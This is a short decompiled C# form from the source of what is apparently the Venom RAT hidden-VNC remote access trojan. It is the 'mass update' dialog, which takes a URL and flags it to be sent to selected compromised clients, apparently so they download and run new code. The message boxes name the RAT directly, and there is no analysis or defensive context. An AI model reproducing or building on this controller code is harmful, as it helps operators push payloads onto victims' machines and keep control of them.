using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Siticone.Desktop.UI.WinForms;

namespace HVNC
{
	// Token: 0x0200001C RID: 28
	public partial class FrmMassUpdate : Form
	{
		// Token: 0x060000C9 RID: 201 RVA: 0x000025D6 File Offset: 0x000007D6
		public FrmMassUpdate()
		{
			this.InitializeComponent();
		}

		// Token: 0x060000CA RID: 202 RVA: 0x0000C340 File Offset: 0x0000A540
		private void StartHiddenURLbtn_Click(object sender, EventArgs e)
		{
			try
			{
				if (string.IsNullOrWhiteSpace(this.Urlbox.Text))
				{
					MessageBox.Show("URL is not valid!");
				}
				else
				{
					FrmMain.MassURL = this.Urlbox.Text;
					FrmMain.ispressed = true;
					MessageBox.Show("Executed Successfully!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					base.Close();
				}
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured When Trying To Update Selected Client(s)");
				base.Close();
			}
		}

		// Token: 0x04000084 RID: 132
		public int count;
	}
}
